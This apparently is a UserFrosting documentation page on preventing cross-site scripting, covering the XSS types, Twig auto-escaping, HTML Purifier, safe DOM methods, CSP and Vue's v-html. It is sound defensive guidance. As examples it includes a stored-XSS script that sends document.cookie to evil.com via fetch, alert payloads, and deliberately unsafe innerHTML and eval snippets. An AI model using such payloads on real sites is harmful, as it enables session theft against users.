---
title: XSS Prevention
description: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into your web pages. Learn how UserFrosting's templating engine and best practices protect against XSS attacks.
---

## What is XSS?

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users. When successful, XSS can allow attackers to:

- Steal session cookies and impersonate users
- Capture keystrokes and form data
- Deface websites
- Redirect users to malicious sites
- Execute actions on behalf of the victim

There are three main types of XSS:

### 1. Stored XSS (Persistent)

The malicious script is permanently stored on your server (e.g., in a database) and served to users when they view the affected page.

**Example:** An attacker posts a comment containing:
```html
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

If this is stored and displayed without proper escaping, it will execute in every visitor's browser.

### 2. Reflected XSS

The malicious script is reflected off the web server in an error message, search result, or any response that includes user input.

**Example:** A search page that displays:
```html
You searched for: <script>alert('XSS')</script>
```

### 3. DOM-based XSS

The vulnerability exists in client-side code that improperly handles user input.

**Example:**
```javascript
// Dangerous!
document.getElementById('welcome').innerHTML = 
    'Welcome, ' + location.hash.substring(1);
```

An attacker could use a URL like `#<script>alert('XSS')</script>` to inject code.

## How UserFrosting Protects Against XSS

### Automatic Output Escaping with Twig

UserFrosting uses **Twig** as its templating engine, which **automatically escapes all output by default**. This means that HTML special characters are converted to their safe equivalents:

```twig
{# This is safe - Twig automatically escapes the output #}
<p>Welcome, {{ user.name }}</p>
```

If `user.name` is `<script>alert('XSS')</script>`, Twig will output:
```html
<p>Welcome, &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;</p>
```

The script tag is displayed as text instead of being executed.

### Rendering Raw HTML (Use with Caution)

Sometimes you genuinely need to output HTML (e.g., user-generated content with formatting). Twig provides the `raw` filter for this, but **use it with extreme caution**:

```twig
{# Only use raw with trusted, sanitized content! #}
{{ article.content | raw }}
```

> [!CAUTION]
> Never use the `raw` filter with unsanitized user input. Always sanitize HTML content using a library like [HTML Purifier](http://htmlpurifier.org/) before storing or displaying it.

### Sanitizing HTML Input

If you need to allow users to submit HTML (e.g., rich text editors), you must sanitize it server-side before storing it:

```php
use HTMLPurifier;
use HTMLPurifier_Config;

// Create a sanitizer configuration
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,b,i,em,strong,a[href],ul,ol,li');

$purifier = new HTMLPurifier($config);
$cleanHtml = $purifier->purify($userInput);
```

This removes any dangerous tags and attributes while preserving safe formatting.

## JavaScript Best Practices

### Avoid innerHTML with User Data

Never use `innerHTML` or similar methods with unsanitized user input:

```javascript
// Dangerous!
element.innerHTML = userInput;

// Safe alternatives:
element.textContent = userInput;  // For plain text
element.innerText = userInput;    // For plain text
```

### Use textContent or createElement

For dynamic content, use safe DOM methods:

```javascript
// Safe approach
const div = document.createElement('div');
div.textContent = userInput;  // Automatically escaped
parent.appendChild(div);
```

### Be Careful with eval() and Similar Functions

Never use `eval()`, `Function()`, `setTimeout(string)`, or `setInterval(string)` with user input:

```javascript
// Extremely dangerous!
eval(userInput);
setTimeout(userInput, 1000);

// Safe alternatives use functions directly:
setTimeout(() => {
    // Your code here
}, 1000);
```

### Validate URLs in Anchors

When creating links dynamically, validate that URLs don't use the `javascript:` protocol:

```javascript
// Dangerous if url comes from user input
element.href = url;

// Safer approach
function isSafeUrl(url) {
    return url.startsWith('http://') || 
           url.startsWith('https://') || 
           url.startsWith('/');
}

if (isSafeUrl(url)) {
    element.href = url;
}
```

## Content Security Policy (CSP)

Consider implementing a Content Security Policy header to provide an additional layer of protection. CSP restricts what resources can be loaded and executed:

```
Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self' https://trusted-cdn.com; 
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
```

This tells the browser to only execute scripts from your domain and a trusted CDN, significantly reducing the impact of XSS vulnerabilities.

## Vue.js and XSS

If you're using Vue components in UserFrosting:

```html
<template>
    <!-- Safe - Vue escapes by default -->
    <div>{{ userInput }}</div>
    
    <!-- Dangerous - renders raw HTML -->
    <div v-html="userInput"></div>
</template>
```

> [!WARNING]
> Never use `v-html` with unsanitized user input. The same sanitization rules apply as with Twig's `raw` filter.
